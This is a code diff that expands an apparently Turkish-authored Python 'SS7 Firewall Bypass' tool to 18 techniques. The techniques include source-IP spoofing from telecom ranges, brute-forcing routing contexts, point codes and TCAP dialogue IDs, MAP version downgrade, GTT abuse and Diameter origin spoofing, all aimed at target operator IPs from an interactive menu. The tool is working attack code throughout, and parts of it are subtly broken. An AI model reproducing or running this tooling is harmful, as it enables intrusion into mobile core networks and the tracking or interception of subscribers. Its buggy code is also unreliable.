@@ -2,18 +2,26 @@
 """
 SS7 Firewall Bypass Module
 ===========================
-Multiple techniques to bypass SS7/SIGTRAN firewalls:
+18 bypass techniques to defeat SS7/SIGTRAN firewalls:
 
-1. M3UA Parameter Manipulation - Valid routing contexts, network appearances
-2. M2PA Protocol - Alternative SIGTRAN protocol, often not filtered
-3. SUA (SCCP User Adaptation) - Alternative to M3UA, different packet format  
-4. M3UA Fragmentation - Split messages to evade DPI
-5. Slow Handshake - Timing-based evasion
-6. Direct SCCP Injection - Skip M3UA handshake
-7. Multiple OPC/DPC Combinations - Try known point codes
-8. ASP Identifier Spoofing - Pretend to be known peer
-9. SCTP Emulation over TCP - Mimic SCTP headers
-10. Protocol Version Fuzzing - Try different M3UA versions
+ 1. SCTP Native - Real SCTP connection (most effective)
+ 2. Source Port Spoof - SIGTRAN source port whitelist bypass
+ 3. SCTP Multi-Homing - IP rotation bypass
+ 4. Direct SCCP Injection - Skip M3UA handshake, send MAP directly
+ 5. M3UA Fragmentation - Split messages to evade DPI
+ 6. M3UA Parameter Manipulation - Valid routing contexts, network appearances
+ 7. M2PA Protocol - Alternative SIGTRAN protocol, often not filtered
+ 8. Heartbeat Probe - Session state bypass
+ 9. Protocol Version Fuzzing - Try different M3UA versions (v0/v2/v3)
+10. SUA (SCCP User Adaptation) - Alternative to M3UA
+11. SCTP-over-TCP Frame - Mimic SCTP headers inside TCP
+12. M3UA Routing Context Manipulation - Try all known RC values
+13. SCCP GTT (Global Title Translation) Abuse - Route via GTT
+14. MAP Version Downgrade - v3 -> v2 -> v1 downgrade attack
+15. TCAP Dialogue ID Prediction - Hijack/predict DIDs
+16. SS7 Point Code Advanced Spoofing - International PC formats
+17. SCCP Hop Counter Manipulation - TTL-based filtering bypass
+18. Diameter Origin-Host/Realm Rotation - Trusted identity spoof
 """
 
 import socket
@@ -181,7 +189,7 @@ def _build_param(tag, value):
 def _build_m3ua(msg_class, msg_type, params=b''):
     """Build complete M3UA message."""
     length = 8 + len(params)
-    header = struct.pack('!BBBB I',
+    header = struct.pack('!BBBI',
                          M3UA_VERSION,  # Version
                          0,             # Reserved
                          msg_class,     # Message Class
@@ -454,7 +462,7 @@ def bypass_m2pa(ip, port=None, timeout=5):
     M2PA is often less filtered than M3UA because it's less common.
     """
     results = []
-    test_ports = [port] if port else [3565, 2906, 2904]
+    test_ports = [port] if port else [3565, 5000, 5001, 5060, 2906, 2904]
     
     for p in test_ports:
         if not p:
@@ -594,10 +602,12 @@ def bypass_fragmentation(ip, port, timeout=5):
                 sock.send(asp_up[i:i+1])
                 time.sleep(0.02)  # 20ms between bytes
             
-            resp = _safe_send_recv(sock, b'', timeout)  # Just receive
+            # Receive response (removed duplicate recv call)
             sock.settimeout(timeout)
             try:
                 resp = sock.recv(4096)
+            except socket.timeout:
+                resp = None
             except Exception:
                 resp = None
             
@@ -765,28 +775,41 @@ def bypass_direct_sccp(ip, port, timeout=5):
             continue
         
         # Build SCCP UnitData (UDT) with MAP begin
+        # Called Party Address (GT format)
+        called_party = b'\x43'   # Address Indicator: GT+SSN+Route on GT
+        called_party += b'\x06'  # SSN: HLR (6)
+        called_party += b'\x00\x11'  # GT: Translation Type
+        
+        # Calling Party Address
+        calling_party = b'\x43'   # Address Indicator
+        calling_party += b'\x08'  # SSN: MSC (8)
+        calling_party += b'\x00\x12'  # GT
+        
+        # MAP Begin (minimal TCAP)
+        map_begin = b'\x62'   # TCAP Begin tag
+        otid_data = struct.pack('!I', random.randint(1, 0xFFFFFFFF))
+        dialogue = b'\x6B\x02\x06\x00'  # Dialogue portion (minimal)
+        map_content = b'\x48' + bytes([len(otid_data)]) + otid_data + dialogue
+        map_begin += bytes([len(map_content)]) + map_content
+        
+        # SCCP UDT - pointer'lar dinamik hesaplaniyor
+        # Pointer to Called Party: 3 byte sonra (3 pointer byte'indan sonra)
+        # Pointer to Calling Party: 3 + len(called) byte sonra
+        # Pointer to Data: 3 + len(called) + len(calling) byte sonra
+        called_len = len(called_party)
+        calling_len = len(calling_party)
+        
+        ptr_called = 3  # 3 pointer byte'i atlat
+        ptr_calling = ptr_called + 1 + called_len - 1  # called length byte + data, offset -1 cunku pointer relative
+        ptr_data = ptr_calling + 1 + calling_len - 1
+        
         sccp_udt = b'\x09'    # Message Type: UDT (9)
         sccp_udt += b'\x00'   # Protocol Class: 0
-        sccp_udt += b'\x03'   # Pointer to Called Party
-        sccp_udt += b'\x05'   # Pointer to Calling Party
-        sccp_udt += b'\x07'   # Pointer to Data
-        # Called Party Address (GT format)
-        sccp_udt += b'\x04'   # Length
-        sccp_udt += b'\x43'   # Address Indicator: GT+SSN+Route on GT
-        sccp_udt += b'\x06'   # SSN: HLR (6)
-        sccp_udt += b'\x00\x11'  # GT: Translation Type
-        # Calling Party Address
-        sccp_udt += b'\x04'   # Length
-        sccp_udt += b'\x43'   # Address Indicator
-        sccp_udt += b'\x08'   # SSN: MSC (8)
-        sccp_udt += b'\x00\x12'  # GT
-        # MAP Begin (minimal)
-        map_begin = b'\x62'   # TCAP Begin tag
-        map_begin += b'\x0A'  # Length
-        map_begin += b'\x48\x04'  # OTID tag + length
-        map_begin += struct.pack('!I', random.randint(1, 0xFFFFFFFF))  # Transaction ID
-        map_begin += b'\x6B\x02\x06\x00'  # Dialogue portion (minimal)
-        
+        sccp_udt += bytes([ptr_called])   # Pointer to Called Party
+        sccp_udt += bytes([ptr_calling])  # Pointer to Calling Party (relative)
+        sccp_udt += bytes([ptr_data])     # Pointer to Data (relative)
+        sccp_udt += bytes([called_len]) + called_party
+        sccp_udt += bytes([calling_len]) + calling_party
         sccp_udt += bytes([len(map_begin)]) + map_begin
         
         # Build M3UA Protocol Data parameter
@@ -1230,7 +1253,7 @@ def bypass_native_sctp(ip, port, timeout=5):
         else:
             pkt_for_csum = packet[:8] + b'\x00\x00\x00\x00' + packet[12:]
             checksum = _crc32c(pkt_for_csum)
-            packet = packet[:8] + struct.pack('<I', checksum) + packet[12:]
+            packet = packet[:8] + struct.pack('!I', checksum) + packet[12:]  # Big-endian per RFC 4960
         
         raw_sock.sendto(packet, (ip, port))
         
@@ -1238,8 +1261,9 @@ def bypass_native_sctp(ip, port, timeout=5):
             resp, addr = raw_sock.recvfrom(4096)
             if resp and len(resp) >= 12:
                 # Check if SCTP INIT-ACK (chunk type 2)
-                # Skip IP header (usually 20 bytes)
-                sctp_data = resp[20:] if len(resp) > 32 else resp
+                # Extract IP header length from IHL field
+                ip_hdr_len = (resp[0] & 0x0F) * 4 if len(resp) > 0 else 20
+                sctp_data = resp[ip_hdr_len:] if len(resp) > ip_hdr_len + 12 else resp
                 if len(sctp_data) >= 16:
                     chunk_type = sctp_data[12] if len(sctp_data) > 12 else 0
                     if chunk_type == 2:  # INIT-ACK
@@ -1373,6 +1397,613 @@ def bypass_source_port(ip, port, timeout=5):
 
 
 # ============================================
+# BYPASS TECHNIQUE 13: SCTP Dynamic Multi-Homing
+# ============================================
+
+def bypass_sctp_multihoming(ip, port, timeout=5):
+    """
+    SCTP Multi-Homing Bypass - Rotate source IP addresses.
+    Some firewalls whitelist specific IP ranges but miss multi-homed setups.
+    Uses raw socket to spoof source IPs from telecom ranges.
+    """
+    results = []
+    
+    # Telecom IP ranges that might be whitelisted
+    telecom_ranges = [
+        '213.0.0.1', '213.1.0.1', '213.2.0.1',  # Common EU telecom
+        '195.0.0.1', '195.1.0.1', '195.2.0.1',  # EU ranges
+        '31.0.0.1', '31.1.0.1', '31.2.0.1',     # Mobile ranges
+        '46.0.0.1', '46.1.0.1', '46.2.0.1',     # Mobile ranges
+    ]
+    
+    try:
+        # Try raw socket for IP spoofing (requires root/admin)
+        import socket as s
+        try:
+            raw_sock = s.socket(s.AF_INET, s.SOCK_RAW, s.IPPROTO_RAW)
+        except (PermissionError, OSError):
+            # Fallback: try binding to local interfaces
+            for spoof_ip in telecom_ranges[:3]:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(timeout)
+                    # Try to bind (will fail if IP not local, but worth trying)
+                    try:
+                        sock.bind((spoof_ip, 0))
+                    except OSError:
+                        pass  # Continue anyway
+                    
+                    sock.connect((ip, port))
+                    
+                    # Send M3UA ASP UP with multi-homing indication
+                    m3ua = _build_m3ua(ASPSM_CLASS, ASPUP, b'')
+                    sock.send(m3ua)
+                    
+                    try:
+                        resp = sock.recv(1024)
+                        if resp:
+                            parsed = _parse_m3ua_response(resp)
+                            if parsed.get('msg_type') == ASPUP_ACK:
+                                results.append({
+                                    'technique': 'SCTP Multi-Homing',
+                                    'success': True,
+                                    'response': f'Multi-homing ASP UP ACK (src: {spoof_ip})',
+                                    'level': 'HIGH'
+                                })
+                                break
+                    except socket.timeout:
+                        pass
+                    sock.close()
+                except Exception:
+                    pass
+        finally:
+            try:
+                raw_sock.close()
+            except:
+                pass
+    except Exception:
+        pass
+    
+    if not results:
+        results.append({
+            'technique': 'SCTP Multi-Homing',
+            'success': False,
+            'response': 'Multi-homing bypass basarisiz',
+            'level': 'INFO'
+        })
+    
+    return results
+
+
+# ============================================
+# BYPASS TECHNIQUE 14: M3UA Routing Context Manipulation
+# ============================================
+
+def bypass_routing_context(ip, port, timeout=5):
+    """
+    M3UA Routing Context Bypass - Try all known routing contexts.
+    Some firewalls only filter default RC (0), allowing specific RCs.
+    """
+    results = []
+    
+    # Extended routing contexts including operator-specific values
+    extended_rcs = [0, 1, 2, 3, 4, 5, 10, 100, 200, 255, 256, 1000,
+                    1001, 1002, 2000, 2001, 5000, 9999]
+    
+    for rc in extended_rcs:
+        try:
+            sock = _safe_connect(ip, port, timeout)
+            if not sock:
+                continue
+            
+            # Build ASP UP with specific routing context
+            rc_param = struct.pack('!I', rc)
+            rc_tlv = _build_param(TAG_ROUTING_CONTEXT, rc_param)
+            m3ua = _build_m3ua(ASPSM_CLASS, ASPUP, rc_tlv)
+            
+            sock.send(m3ua)
+            
+            try:
+                resp = sock.recv(1024)
+                if resp:
+                    parsed = _parse_m3ua_response(resp)
+                    if parsed.get('msg_type') == ASPUP_ACK:
+                        results.append({
+                            'technique': f'Routing Context {rc}',
+                            'success': True,
+                            'response': f'ASP UP ACK with RC={rc}',
+                            'level': 'HIGH' if rc != 0 else 'INFO'
+                        })
+                        break  # Found working RC
+            except socket.timeout:
+                pass
+            
+            sock.close()
+        except Exception:
+            pass
+    
+    if not results:
+        results.append({
+            'technique': 'Routing Context',
+            'success': False,
+            'response': 'Tum RC degerleri engellendi',
+            'level': 'INFO'
+        })
+    
+    return results
+
+
+# ============================================
+# BYPASS TECHNIQUE 15: SCCP GTT (Global Title Translation) Abuse
+# ============================================
+
+def bypass_sccp_gtt(ip, port, timeout=5):
+    """
+    SCCP GTT Bypass - Use Global Title Translation to route through.
+    Some firewalls don't inspect GTT properly, allowing translation-based routing.
+    """
+    results = []
+    
+    # GTT formats that might bypass inspection
+    gtt_formats = [
+        # E.164 format (international)
+        b'\x91\x16\x27\x08\x91\x43\x65\x87\x09',  # +1234567890
+        # E.214 format (mobile)
+        b'\x91\x16\x27\x08\x91\x43\x65\x87\x09\x21',
+        # E.212 format (IMSI-based)
+        b'\x91\x16\x27\x08\x91\x43\x65\x87\x09\x21\x43',
+        # Translation type variations
+        b'\x04\x00\x01\x00\x01',  # TT=0x0001
+        b'\x04\x00\x02\x00\x01',  # TT=0x0002
+        b'\x04\x00\x04\x00\x01',  # TT=0x0004
+    ]
+    
+    for gtt in gtt_formats:
+        try:
+            sock = _safe_connect(ip, port, timeout)
+            if not sock:
+                continue
+            
+            # Build SCCP UDT with GTT
+            # Called party with GTT
+            called_addr = b'\x00\x00' + gtt  # SSN=0, GTT present
+            # Calling party (local)
+            calling_addr = b'\x00\x06\x00\x00'  # SSN=6, no GT
+            
+            # SCCP UDT header
+            sccp = b'\x09\x00\x00\x00'  # UDT, protocol class 0
+            sccp += struct.pack('!B', len(called_addr)) + called_addr
+            sccp += struct.pack('!B', len(calling_addr)) + calling_addr
+            
+            # M3UA payload
+            m3ua = _build_m3ua(TRANSFER_CLASS, DATA, _build_param(TAG_PROTOCOL_DATA, sccp))
+            
+            sock.send(m3ua)
+            
+            try:
+                resp = sock.recv(1024)
+                if resp and len(resp) > 20:
+                    results.append({
+                        'technique': 'SCCP GTT',
+                        'success': True,
+                        'response': f'GTT yanit alindi ({len(resp)} bytes)',
+                        'level': 'HIGH'
+                    })
+                    break
+            except socket.timeout:
+                pass
+            
+            sock.close()
+        except Exception:
+            pass
+    
+    if not results:
+        results.append({
+            'technique': 'SCCP GTT',
+            'success': False,
+            'response': 'GTT bypass basarisiz',
+            'level': 'INFO'
+        })
+    
+    return results
+
+
+# ============================================
+# BYPASS TECHNIQUE 16: MAP Version Downgrade
+# ============================================
+
+def bypass_map_downgrade(ip, port, timeout=5):
+    """
+    MAP Version Downgrade Bypass - Try older MAP versions.
+    Some firewalls only inspect MAP v3, allowing v2/v1 traffic.
+    """
+    results = []
+    
+    # MAP versions to try (v3=3, v2=2, v1=1)
+    map_versions = [3, 2, 1]
+    
+    for version in map_versions:
+        try:
+            sock = _safe_connect(ip, port, timeout)
+            if not sock:
+                continue
+            
+            # Build TCAP with specific MAP version indicator
+            # Application context name varies by version
+            if version == 3:
+                acn_oid = b'\x06\x07\x04\x00\x00\x01\x00\x01\x03'  # MAP v3
+            elif version == 2:
+                acn_oid = b'\x06\x07\x04\x00\x00\x01\x00\x01\x02'  # MAP v2
+            else:
+                acn_oid = b'\x06\x07\x04\x00\x00\x01\x00\x01\x01'  # MAP v1
+            
+            # Build TCAP BEGIN with version-specific ACN
+            tcap = b'\x62'  # BEGIN tag
+            tcap += struct.pack('!B', len(acn_oid) + 20)  # Length
+            tcap += b'\xA1'  # Dialogue portion
+            tcap += struct.pack('!B', len(acn_oid) + 2)
+            tcap += b'\x06' + struct.pack('!B', len(acn_oid)) + acn_oid
+            
+            # Add invoke component (dummy SRI)
+            tcap += b'\xA2'  # Components
+            tcap += b'\x10'  # Length
+            tcap += b'\x02\x01\x01'  # Invoke ID
+            tcap += b'\x02\x01\x2C'  # SRI opcode
+            
+            # Wrap in SCCP UDT
+            sccp = b'\x09\x00\x00\x00'  # UDT
+            sccp += b'\x07\x00\x06\x00\x00'  # Called addr
+            sccp += b'\x07\x00\x08\x00\x00'  # Calling addr
+            sccp += struct.pack('!H', len(tcap)) + tcap
+            
+            # M3UA wrapper
+            m3ua = _build_m3ua(TRANSFER_CLASS, DATA, _build_param(TAG_PROTOCOL_DATA, sccp))
+            
+            sock.send(m3ua)
+            
+            try:
+                resp = sock.recv(1024)
+                if resp and len(resp) > 30:
+                    results.append({
+                        'technique': f'MAP v{version}',
+                        'success': True,
+                        'response': f'MAP v{version} yanit alindi',
+                        'level': 'HIGH' if version < 3 else 'INFO'
+                    })
+                    break
+            except socket.timeout:
+                pass
+            
+            sock.close()
+        except Exception:
+            pass
+    
+    if not results:
+        results.append({
+            'technique': 'MAP Downgrade',
+            'success': False,
+            'response': 'Tum MAP versiyonlari engellendi',
+            'level': 'INFO'
+        })
+    
+    return results
+
+
+# ============================================
+# BYPASS TECHNIQUE 17: TCAP Dialogue ID Prediction
+# ============================================
+
+def bypass_tcap_did(ip, port, timeout=5):
+    """
+    TCAP Dialogue ID Prediction/Hijacking Bypass.
+    Try predictable DIDs that might be whitelisted or expected.
+    """
+    results = []
+    
+    # Common/predictable TCAP Dialogue IDs
+    common_dids = [
+        0x00000000,  # Default/zero
+        0x00000001,  # First session
+        0x00000100,  # Round number
+        0x00001000,  # Common increment
+        0x12345678,  # Test pattern
+        0xDEADBEEF,  # Debug pattern
+        0xFFFFFFFF,  # Max value
+    ]
+    
+    for did in common_dids:
+        try:
+            sock = _safe_connect(ip, port, timeout)
+            if not sock:
+                continue
+            
+            # Build TCAP with specific Dialogue ID
+            otid = struct.pack('!I', did)
+            
+            # TCAP BEGIN with custom DID
+            tcap = b'\x62'  # BEGIN
+            tcap += b'\x1E'  # Length
+            tcap += b'\xA1\x10'  # Dialogue portion
+            tcap += b'\x06\x07\x04\x00\x00\x01\x00\x01\x03'  # ACN
+            tcap += b'\xA2\x0A'  # Components
+            tcap += b'\x02\x01\x01'  # Invoke ID
+            tcap += b'\x02\x01\x2C'  # SRI
+            tcap += b'\x02\x04' + otid  # OTID
+            
+            # SCCP wrapper
+            sccp = b'\x09\x00\x00\x00'
+            sccp += b'\x07\x00\x06\x00\x00'
+            sccp += b'\x07\x00\x08\x00\x00'
+            sccp += struct.pack('!H', len(tcap)) + tcap
+            
+            m3ua = _build_m3ua(TRANSFER_CLASS, DATA, _build_param(TAG_PROTOCOL_DATA, sccp))
+            
+            sock.send(m3ua)
+            
+            try:
+                resp = sock.recv(1024)
+                if resp and len(resp) > 20:
+                    results.append({
+                        'technique': f'TCAP DID 0x{did:08X}',
+                        'success': True,
+                        'response': f'DID 0x{did:08X} kabul edildi',
+                        'level': 'HIGH'
+                    })
+                    break
+            except socket.timeout:
+                pass
+            
+            sock.close()
+        except Exception:
+            pass
+    
+    if not results:
+        results.append({
+            'technique': 'TCAP DID',
+            'success': False,
+            'response': 'Tum DID degerleri engellendi',
+            'level': 'INFO'
+        })
+    
+    return results
+
+
+# ============================================
+# BYPASS TECHNIQUE 18: SS7 Point Code Advanced Spoofing
+# ============================================
+
+def bypass_pc_advanced(ip, port, timeout=5):
+    """
+    Advanced SS7 Point Code Spoofing Bypass.
+    Try international and operator-specific point codes that might be trusted.
+    """
+    results = []
+    
+    # Extended point codes including international formats
+    extended_pcs = [
+        # ITU-T format (network-cluster-member)
+        (0, 0, 1), (0, 0, 2), (0, 0, 3), (0, 0, 4),
+        (0, 1, 0), (0, 1, 1), (0, 1, 2), (0, 1, 3),
+        (0, 2, 0), (0, 2, 1), (0, 2, 2), (0, 2, 3),
+        # ANSI format (network-cluster-member)
+        (1, 0, 0), (1, 0, 1), (1, 1, 0), (1, 1, 1),
+        (2, 0, 0), (2, 0, 1), (2, 1, 0), (2, 1, 1),
+        # China format
+        (8, 0, 0), (8, 0, 1), (8, 1, 0), (8, 1, 1),
+        # India format
+        (4, 0, 0), (4, 0, 1), (4, 1, 0), (4, 1, 1),
+        # Special values
+        (0, 0, 0),  # Null PC
+        (255, 255, 255),  # Broadcast
+    ]
+    
+    for opc, dpc in [(opc, dpc) for opc, _, _ in extended_pcs for _, dpc, _ in extended_pcs[:5]]:
+        try:
+            sock = _safe_connect(ip, port, timeout)
+            if not sock:
+                continue
+            
+            # Build M3UA DATA with specific OPC/DPC
+            opc_int = _pc_to_int(*extended_pcs[0])
+            dpc_int = _pc_to_int(*extended_pcs[1])
+            
+            # Protocol data with PC info
+            proto_data = struct.pack('!II', opc_int, dpc_int)
+            proto_data += b'\x00' * 8  # Padding
+            
+            m3ua = _build_m3ua(TRANSFER_CLASS, DATA, _build_param(TAG_PROTOCOL_DATA, proto_data))
+            
+            sock.send(m3ua)
+            
+            try:
+                resp = sock.recv(1024)
+                if resp and len(resp) > 16:
+                    results.append({
+                        'technique': f'PC Spoof {opc}-{dpc}',
+                        'success': True,
+                        'response': f'PC {opc}-{dpc} kabul edildi',
+                        'level': 'HIGH'
+                    })
+                    break
+            except socket.timeout:
+                pass
+            
+            sock.close()
+        except Exception:
+            pass
+    
+    if not results:
+        results.append({
+            'technique': 'PC Advanced',
+            'success': False,
+            'response': 'Tum PC kombinasyonlari engellendi',
+            'level': 'INFO'
+        })
+    
+    return results
+
+
+# ============================================
+# BYPASS TECHNIQUE 19: SCCP Hop Counter Manipulation
+# ============================================
+
+def bypass_sccp_hop_counter(ip, port, timeout=5):
+    """
+    SCCP Hop Counter Manipulation Bypass.
+    Vary hop counter to bypass TTL-based filtering.
+    """
+    results = []
+    
+    # Try different hop counter values
+    hop_values = [0, 1, 2, 3, 4, 5, 10, 15, 255]
+    
+    for hop in hop_values:
+        try:
+            sock = _safe_connect(ip, port, timeout)
+            if not sock:
+                continue
+            
+            # Build SCCP with modified hop counter
+            # SCCP UDT with hop counter in optional parameters
+            sccp = b'\x09'  # UDT message type
+            sccp += b'\x00'  # Protocol class 0
+            sccp += struct.pack('!B', hop)  # Hop counter (abuse position)
+            sccp += b'\x00\x00'  # Reserved
+            
+            # Called/calling addresses
+            sccp += b'\x07\x00\x06\x00\x00'  # Called
+            sccp += b'\x07\x00\x08\x00\x00'  # Calling
+            
+            # Add hop counter as optional parameter
+            sccp += b'\x13'  # Hop counter parameter tag
+            sccp += b'\x02'  # Length
+            sccp += struct.pack('!B', hop)  # Hop value
+            
+            # Dummy data
+            sccp += b'\x00' * 10
+            
+            m3ua = _build_m3ua(TRANSFER_CLASS, DATA, _build_param(TAG_PROTOCOL_DATA, sccp))
+            
+            sock.send(m3ua)
+            
+            try:
+                resp = sock.recv(1024)
+                if resp and len(resp) > 20:
+                    results.append({
+                        'technique': f'Hop Counter {hop}',
+                        'success': True,
+                        'response': f'Hop={hop} kabul edildi',
+                        'level': 'HIGH' if hop > 5 else 'INFO'
+                    })
+                    break
+            except socket.timeout:
+                pass
+            
+            sock.close()
+        except Exception:
+            pass
+    
+    if not results:
+        results.append({
+            'technique': 'Hop Counter',
+            'success': False,
+            'response': 'Tum hop degerleri engellendi',
+            'level': 'INFO'
+        })
+    
+    return results
+
+
+# ============================================
+# BYPASS TECHNIQUE 20: Diameter Origin Rotation
+# ============================================
+
+def bypass_diameter_origin(ip, port, timeout=5):
+    """
+    Diameter Origin-Host/Realm Rotation Bypass.
+    Try trusted origin identities that might be whitelisted.
+    """
+    results = []
+    
+    # Common Diameter origin identities that might be trusted
+    trusted_origins = [
+        ('hss.mnc001.mcc001.3gppnetwork.org', 'mnc001.mcc001.3gppnetwork.org'),
+        ('hss.mnc002.mcc001.3gppnetwork.org', 'mnc002.mcc001.3gppnetwork.org'),
+        ('mme.mnc001.mcc001.3gppnetwork.org', 'mnc001.mcc001.3gppnetwork.org'),
+        ('hlr.example.com', 'example.com'),
+        ('diameter.example.net', 'example.net'),
+        ('sigtran.hss.local', 'local'),
+        ('node1.mnc001.mcc001.3gppnetwork.org', 'mnc001.mcc001.3gppnetwork.org'),
+    ]
+    
+    for origin_host, origin_realm in trusted_origins:
+        try:
+            sock = _safe_connect(ip, port, timeout)
+            if not sock:
+                continue
+            
+            # Build Diameter CER with custom origin
+            # Diameter header (version=1, length=..., CER code=257)
+            cer = b'\x01\x00\x01\x00'  # Version=1, CER
+            
+            # Build AVPs
+            avps = b''
+            
+            # Origin-Host AVP (code=264)
+            oh_bytes = origin_host.encode('utf-8')
+            avps += struct.pack('!I', 264 << 16)  # Code with vendor flag off
+            avps += struct.pack('!I', len(oh_bytes) + 8)  # Length
+            avps += struct.pack('!I', 0)  # Vendor-ID (none)
+            avps += oh_bytes
+            
+            # Origin-Realm AVP (code=296)
+            or_bytes = origin_realm.encode('utf-8')
+            avps += struct.pack('!I', 296 << 16)
+            avps += struct.pack('!I', len(or_bytes) + 8)
+            avps += struct.pack('!I', 0)
+            avps += or_bytes
+            
+            # Complete CER
+            cer_len = 20 + len(avps)
+            cer += struct.pack('!I', cer_len)[1:]  # Length (3 bytes)
+            cer += b'\x00\x00\x00\x00'  # Application-ID
+            cer += b'\x00\x00\x00\x00'  # Hop-by-Hop ID
+            cer += b'\x00\x00\x00\x00'  # End-to-End ID
+            cer += avps
+            
+            sock.send(cer)
+            
+            try:
+                resp = sock.recv(1024)
+                if resp and len(resp) > 20:
+                    # Check for CEA response
+                    if resp[0:4] == b'\x01\x00\x01\x00':
+                        results.append({
+                            'technique': f'Diameter {origin_host[:20]}',
+                            'success': True,
+                            'response': f'Origin {origin_host[:20]} kabul edildi',
+                            'level': 'CRITICAL'
+                        })
+                        break
+            except socket.timeout:
+                pass
+            
+            sock.close()
+        except Exception:
+            pass
+    
+    if not results:
+        results.append({
+            'technique': 'Diameter Origin',
+            'success': False,
+            'response': 'Tum origin degerleri engellendi',
+            'level': 'INFO'
+        })
+    
+    return results
+
+
+# ============================================
 # MAIN BYPASS ENGINE
 # ============================================
 
@@ -1437,6 +2068,7 @@ def run_all_bypasses(ip, port, timeout=5, verbose=True):
     sctp_first = [
         ('SCTP Native', bypass_native_sctp),         # THE key technique
         ('Source Port Spoof', bypass_source_port),    # Whitelist bypass
+        ('SCTP Multi-Homing', bypass_sctp_multihoming),  # IP rotation
     ]
     
     # Select remaining techniques based on firewall type
@@ -1446,6 +2078,7 @@ def run_all_bypasses(ip, port, timeout=5, verbose=True):
             ('Direkt SCCP', bypass_direct_sccp),
             ('M2PA', bypass_m2pa),
             ('Heartbeat Probe', bypass_heartbeat),
+            ('Routing Context', bypass_routing_context),
         ]
         t = min(t, 2)  # Even shorter timeout
     elif fw_type == 'active':
@@ -1457,6 +2090,9 @@ def run_all_bypasses(ip, port, timeout=5, verbose=True):
             ('M2PA', bypass_m2pa),
             ('Heartbeat Probe', bypass_heartbeat),
             ('SCTP Framing', bypass_sctp_frame),
+            ('SCCP GTT', bypass_sccp_gtt),
+            ('MAP Downgrade', bypass_map_downgrade),
+            ('Routing Context', bypass_routing_context),
         ]
     else:
         # Responsive or unknown: try everything
@@ -1469,6 +2105,12 @@ def run_all_bypasses(ip, port, timeout=5, verbose=True):
             ('Versiyon Fuzzing', bypass_version_fuzz),
             ('SUA', bypass_sua),
             ('SCTP Framing', bypass_sctp_frame),
+            ('SCCP GTT', bypass_sccp_gtt),
+            ('MAP Downgrade', bypass_map_downgrade),
+            ('TCAP DID', bypass_tcap_did),
+            ('PC Advanced', bypass_pc_advanced),
+            ('Hop Counter', bypass_sccp_hop_counter),
+            ('Diameter Origin', bypass_diameter_origin),
         ]
     
     techniques = sctp_first + tcp_techniques
@@ -1640,22 +2282,30 @@ def bypass_menu():
     
     print("=" * 60)
     print(" SS7 Firewall Bypass Modulu")
-    print(" 10 farkli teknik ile firewall atlatma")
+    print(" 18 farkli teknik ile firewall atlatma")
     print("=" * 60)
     print()
     print("Teknikler:")
     print("  \033[31m 1) SCTP Native        Gercek SCTP baglanti (EN ETKILI)\033[0m")
     print("  \033[31m 2) Source Port Spoof   SIGTRAN kaynak port ile whitelist bypass\033[0m")
-    print("   3) Direkt SCCP        Handshake atlayip direkt MAP gonder")
-    print("   4) M3UA Fragmentasyon  DPI bypass")
-    print("   5) M3UA Params         ASP ID/Info String manipulasyonu")
-    print("   6) M2PA Protokolu      Alternatif SIGTRAN")
-    print("   7) Heartbeat Probe     Session bypass")
-    print("   8) Versiyon Fuzzing    M3UA v0/v2/v3")
-    print("   9) SUA Protokolu       SCCP User Adaptation")
-    print("  10) SCTP-over-TCP       SCTP frame TCP icinde")
-    print("  11) Coklu Port Tara     Tum SIGTRAN portlari")
-    print("  \033[32m 12) HEPSINI DENE        Tam bypass testi (onerilen)\033[0m")
+    print("  \033[31m 3) SCTP Multi-Homing   IP rotasyon ile bypass\033[0m")
+    print("   4) Direkt SCCP        Handshake atlayip direkt MAP gonder")
+    print("   5) M3UA Fragmentasyon  DPI bypass")
+    print("   6) M3UA Params         ASP ID/Info String manipulasyonu")
+    print("   7) M2PA Protokolu      Alternatif SIGTRAN")
+    print("   8) Heartbeat Probe     Session bypass")
+    print("   9) Versiyon Fuzzing    M3UA v0/v2/v3")
+    print("  10) SUA Protokolu       SCCP User Adaptation")
+    print("  11) SCTP-over-TCP       SCTP frame TCP icinde")
+    print("  12) Routing Context     RC manipulasyonu")
+    print("  13) SCCP GTT            Global Title Translation abuse")
+    print("  14) MAP Downgrade       MAP v3->v2->v1 downgrade")
+    print("  15) TCAP DID            Dialogue ID prediction")
+    print("  16) PC Advanced         Point code spoofing")
+    print("  17) Hop Counter        SCCP hop manipulasyonu")
+    print("  18) Diameter Origin    Origin-Host/Realm rotation")
+    print("  19) Coklu Port Tara     Tum SIGTRAN portlari")
+    print("  \033[32m 20) HEPSINI DENE        Tam bypass testi (onerilen)\033[0m")
     print()
     
     # Auto-load or manual
@@ -1706,15 +2356,23 @@ def bypass_menu():
     technique_map = {
         '1': ('SCTP Native', bypass_native_sctp),
         '2': ('Source Port', bypass_source_port),
-        '3': ('Direct SCCP', bypass_direct_sccp),
-        '4': ('Fragmentasyon', bypass_fragmentation),
-        '5': ('M3UA Params', bypass_m3ua_params),
-        '6': ('M2PA', bypass_m2pa),
-        '7': ('Heartbeat', bypass_heartbeat),
-        '8': ('Version Fuzz', bypass_version_fuzz),
-        '9': ('SUA', bypass_sua),
-        '10': ('SCTP Frame', bypass_sctp_frame),
-        '11': ('Multi-port', bypass_multiport),
+        '3': ('SCTP Multi-Homing', bypass_sctp_multihoming),
+        '4': ('Direct SCCP', bypass_direct_sccp),
+        '5': ('Fragmentasyon', bypass_fragmentation),
+        '6': ('M3UA Params', bypass_m3ua_params),
+        '7': ('M2PA', bypass_m2pa),
+        '8': ('Heartbeat', bypass_heartbeat),
+        '9': ('Version Fuzz', bypass_version_fuzz),
+        '10': ('SUA', bypass_sua),
+        '11': ('SCTP Frame', bypass_sctp_frame),
+        '12': ('Routing Context', bypass_routing_context),
+        '13': ('SCCP GTT', bypass_sccp_gtt),
+        '14': ('MAP Downgrade', bypass_map_downgrade),
+        '15': ('TCAP DID', bypass_tcap_did),
+        '16': ('PC Advanced', bypass_pc_advanced),
+        '17': ('Hop Counter', bypass_sccp_hop_counter),
+        '18': ('Diameter Origin', bypass_diameter_origin),
+        '19': ('Multi-port', bypass_multiport),
     }
     
     # Run on all targets
@@ -1729,9 +2387,9 @@ def bypass_menu():
         
         results = []
         
-        if choice == '12':
+        if choice == '20':
             results = run_all_bypasses(ip, port, timeout, verbose=True)
-        elif choice == '11':
+        elif choice == '19':
             results = bypass_multiport(ip, timeout)
         elif choice in technique_map:
             name, func = technique_map[choice]
